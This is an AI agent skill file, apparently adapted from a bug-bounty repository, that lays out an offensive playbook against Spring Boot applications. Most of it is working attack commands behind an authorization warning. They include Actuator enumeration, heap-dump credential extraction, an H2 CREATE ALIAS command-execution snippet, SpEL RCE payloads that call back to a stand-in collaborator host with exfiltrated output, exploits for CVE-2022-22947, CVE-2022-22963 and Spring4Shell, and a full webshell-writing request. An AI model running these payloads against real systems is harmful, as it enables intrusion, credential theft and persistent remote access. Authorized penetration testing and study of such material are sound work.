---
name: hunt-springboot
description: Hunt Spring Boot specific vulnerabilities
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: hackerone_public, cve_database, spring_security_advisories
report_count: 16
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

# HUNT-SPRINGBOOT — Spring Boot Specific Vulnerabilities

## Crown Jewel Targets

Spring Boot Actuator `/actuator/heapdump` exposed = heap dump with all secrets in memory.

**Highest-value findings:**
- **`/actuator/heapdump`** — full JVM heap dump contains plaintext passwords, tokens, DB credentials, private keys stored anywhere in memory
- **`/actuator/env`** — lists all environment variables and Spring properties including secrets
- **`/actuator/shutdown`** — POST → shuts down the application (Critical availability impact)
- **H2 Console (`/h2-console`)** — in-memory DB admin UI → SQL query execution → potential RCE via `CREATE ALIAS` trick
- **SpEL injection** — Spring Expression Language in template fields, `@Value` annotations, SpEL-processed request params → RCE
- **Spring4Shell CVE-2022-22965** — Spring Framework < 5.3.18 + Tomcat → RCE via data binding

---

## Phase 1 — Fingerprint Spring Boot

```bash
# Spring Boot indicators
curl -sI https://$TARGET/ | grep -i "x-application-context\|x-content-type"
curl -s "https://$TARGET/nonexistent" | grep -i "Whitelabel Error Page\|Spring Boot\|org.springframework"

# Actuator root (may list available endpoints)
curl -s "https://$TARGET/actuator" | python3 -m json.tool 2>/dev/null
curl -s "https://$TARGET/actuator/" | python3 -m json.tool 2>/dev/null

# Try common base paths
for base in "" "/manage" "/management" "/app"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$base/actuator")
  [ "$STATUS" = "200" ] && echo "[+] Actuator at: $TARGET$base/actuator"
done
```

---

## Phase 2 — Actuator Endpoint Enumeration

```bash
BASE="https://$TARGET/actuator"

# High-impact endpoints
ENDPOINTS=("env" "heapdump" "threaddump" "mappings" "beans" "metrics" 
           "loggers" "info" "health" "configprops" "shutdown" "trace"
           "httptrace" "auditevents" "sessions" "scheduledtasks" "caches"
           "flyway" "liquibase" "refresh" "restart")

for EP in "${ENDPOINTS[@]}"; do
  # Don't trust HTTP 200 alone — Spring returns 200 with a Whitelabel/login
  # page for many paths. Require actuator-shaped JSON (or a heapdump body)
  # before calling it EXPOSED.
  BODY=$(curl -s -H "Accept: application/json" "$BASE/$EP")
  CT=$(curl -s -o /dev/null -w "%{content_type}" -H "Accept: application/json" "$BASE/$EP")
  if echo "$CT" | grep -qi "json" && ! echo "$BODY" | grep -qi "Whitelabel Error Page\|<html"; then
    echo "[+] EXPOSED: $BASE/$EP"
  fi
done

# Get environment variables (passwords, API keys)
curl -s "$BASE/env" | python3 -m json.tool 2>/dev/null | grep -i "password\|secret\|key\|token\|credential" | head -20

# Get all endpoint mappings (full API surface)
curl -s "$BASE/mappings" | python3 -m json.tool 2>/dev/null | grep -oP '"pattern":"\K[^"]+' | sort

# Get Spring beans (lists all registered beans, reveals internal architecture)
curl -s "$BASE/beans" | python3 -m json.tool 2>/dev/null | head -100
```

---

## Phase 3 — Heap Dump Analysis

```bash
# Download heap dump (can be large — 100MB+)
curl -s "$BASE/heapdump" -o /tmp/heapdump.hprof
ls -lh /tmp/heapdump.hprof

# Quick grep for secrets in heap dump (binary file — use strings)
strings /tmp/heapdump.hprof | grep -iE "(password|secret|apikey|api_key|token|bearer|private_key)" | \
  grep -v "^[a-z_]" | sort -u | head -50

# More targeted extraction
strings /tmp/heapdump.hprof | grep -oP "(?:password|passwd|pwd)\s*[=:]\s*\S+" | sort -u | head -20
strings /tmp/heapdump.hprof | grep -oP "AKIA[A-Z0-9]{16}" | sort -u        # AWS keys
strings /tmp/heapdump.hprof | grep -oP "sk_live_[A-Za-z0-9]+" | sort -u     # Stripe keys
strings /tmp/heapdump.hprof | grep -oP "Bearer [A-Za-z0-9._-]+" | sort -u   # Bearer tokens

# Use Eclipse Memory Analyzer (MAT) for deep analysis
# https://www.eclipse.org/mat/
```

---

## Phase 4 — H2 Console RCE

```bash
# H2 console detection
curl -s "https://$TARGET/h2-console" | grep -i "H2 Console\|H2 Database"
curl -s "https://$TARGET/h2" | grep -i "H2 Console"
curl -s "https://$TARGET/console" | grep -i "H2"

# Default credentials: sa / (empty password)
# JDBC URL: jdbc:h2:mem:testdb

# If accessible, RCE via CREATE ALIAS:
# SQL to execute:
# CREATE ALIAS EXEC AS $$ String exec(String cmd) throws Exception {
#   Runtime rt = Runtime.getRuntime();
#   String[] commands = {"sh","-c",cmd};
#   Process proc = rt.exec(commands);
#   return new String(proc.getInputStream().readAllBytes());
# } $$;
# CALL EXEC('id');
```

---

## Phase 5 — SpEL Injection

```bash
# Spring Expression Language injection in user-controlled fields
# Test: ${7*7} or #{7*7} → if the response reflects 49, SpEL is being evaluated

# Common injection points:
# - Email template fields: "Hello ${name}"
# - Custom annotation @Value("${user.input}")
# - Spring Security expressions
# - Spring WebFlow

# Basic SpEL test
curl -s -X POST "https://$TARGET/api/user/name" \
  -H "Content-Type: application/json" \
  -d '{"name": "#{7*7}"}'
# If returns 49 → SpEL injection confirmed

# RCE payload — note: exec() returns a Process, not a String, so a bare
# exec("id") produces NO visible output. Confirm via an OOB curl callback
# (the spawned curl makes the network request even though nothing is reflected):
curl -s -X POST "https://$TARGET/api/user/name" \
  -H "Content-Type: application/json" \
  -d '{"name": "#{T(java.lang.Runtime).getRuntime().exec(new String[]{\"sh\",\"-c\",\"curl COLLAB_HOST/spel-$(id|base64)\"})}"}'

# CVE-2022-22963 — Spring Cloud Function SpEL
curl -s -X POST "https://$TARGET/functionRouter" \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"curl COLLAB_HOST/spel-rce\")" \
  -d "test"
```

---

## Phase 5b — Spring Cloud Gateway Actuator SpEL RCE (CVE-2022-22947)
If the `gateway` actuator is exposed, add a route whose filter body is SpEL, then refresh to evaluate it (escape inner quotes for your shell):
```bash
curl -s -X POST "$BASE/actuator/gateway/routes/hax" -H "Content-Type: application/json" \
 -d '{"id":"hax","filters":[{"name":"AddResponseHeader","args":{"name":"X","value":"#{T(java.lang.Runtime).getRuntime().exec(new String[]{ \"id\" })}"}}],"uri":"http://x"}'
curl -s -X POST "$BASE/actuator/gateway/refresh"; curl -s "$BASE/actuator/gateway/routes"
```

## Phase 5c — Writable `/env` -> `/refresh` gadget RCE
When `/actuator/env` accepts POST and `/actuator/refresh` exists, poison a property then reload:
```bash
# logback JNDI:
curl -s -X POST "$BASE/actuator/env" -H "Content-Type: application/json" -d '{"name":"logging.config","value":"http://$COLLAB/logback.xml"}'
# Eureka XStream deserialization:
curl -s -X POST "$BASE/actuator/env" -H "Content-Type: application/json" -d '{"name":"eureka.client.serviceUrl.defaultZone","value":"http://$COLLAB/x"}'
curl -s -X POST "$BASE/actuator/refresh"
```
(Veracode: Exploiting Spring Boot Actuators.)

## Phase 6 — Spring4Shell (CVE-2022-22965)

```bash
# Affects: Spring Framework < 5.3.18 and < 5.2.20 (and all older branches);
# fixed in 5.3.18 / 5.2.20. Requires JDK 9+ and WAR-on-Tomcat deployment.
# Requires: Java 9+, Tomcat as WAR deployment

# Detection: does the app accept class.* parameters?
curl -s "https://$TARGET/api/user" \
  -d "class.module.classLoader.URLs[0]=jar:http://COLLAB_HOST/test.jar!/"
# Check COLLAB for HTTP callback

# Exploitation: write webshell via class loader
curl -s "https://$TARGET/login" \
  --data-raw "username=test&password=test&class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di+if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B+java.io.InputStream+in+%3D+Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B+int+a+%3D+-1%3B+byte%5B%5D+b+%3D+new+byte%5B2048%5D%3B+while((a%3Din.read(b))!%3D-1)%7B+out.println(new+String(b))%3B+%7D+%7D+%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps%2FROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
```

---

## Phase 7 — Jolokia JMX Exposure

```bash
# Jolokia provides HTTP access to JMX MBeans
curl -s "https://$TARGET/jolokia" | python3 -m json.tool 2>/dev/null | head -20
curl -s "https://$TARGET/actuator/jolokia" | python3 -m json.tool 2>/dev/null | head -20

# List all MBeans
curl -s "https://$TARGET/jolokia/list" | python3 -m json.tool 2>/dev/null | grep -i "type\|operation" | head -30

# Read system properties via Jolokia (may expose credentials)
curl -s "https://$TARGET/jolokia/read/java.lang:type=Runtime/SystemProperties" | \
  python3 -m json.tool 2>/dev/null | grep -i "password\|secret\|key"

# Exec MBean operations (potential RCE via MLet)
curl -s "https://$TARGET/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/tmp/evil"
```

---

## Chain Table

| Spring Boot finding | Chain to | Impact |
|--------------------|----------|--------|
| `/actuator/heapdump` | Extract DB passwords, API keys from memory | Critical credential exfil |
| `/actuator/env` | Read all env vars including secrets | High |
| H2 console accessible | CREATE ALIAS → RCE | Critical |
| SpEL injection | `T(Runtime).exec()` → OS command | Critical RCE |
| Spring4Shell | Write webshell → RCE | Critical |
| Jolokia + MLet | Remote code via MBean | Critical RCE |

---

## Validation

✅ Heap dump: strings command extracts readable passwords/tokens from .hprof file
✅ Actuator/env: secrets visible in JSON response
✅ SpEL: arithmetic expression evaluates (7*7=49) or OOB callback received
✅ H2 console: SQL executed, `id` output returned

**Severity:**
- Heapdump with credentials: Critical
- SpEL RCE: Critical
- H2 console RCE: Critical
- Actuator env (passwords exposed): High
- Mappings disclosure only: Low-Medium

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
